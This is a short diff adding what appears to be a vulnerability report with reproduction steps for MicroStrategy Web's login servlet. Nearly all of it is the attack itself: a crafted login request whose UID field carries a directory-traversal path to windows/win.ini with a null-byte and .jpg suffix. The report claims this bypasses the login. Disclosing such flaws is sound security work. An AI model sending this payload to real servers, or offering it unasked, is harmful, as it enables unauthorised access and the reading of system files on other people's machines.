@@ -1,0 +1,12 @@
+Steps to reproduce
+
+Visit: https://localhost/MicroStrategy/servlet/mstrWeb
+
+Now
+give any username and password
+Got Login Failure
+now manipulate UID VALUE AS
+
+Uid=/../../../../../../../../../../../windows/win.ini%00.jpg&Pwd=aa&ConnMode=1&3054=Login
+
+login bypassed
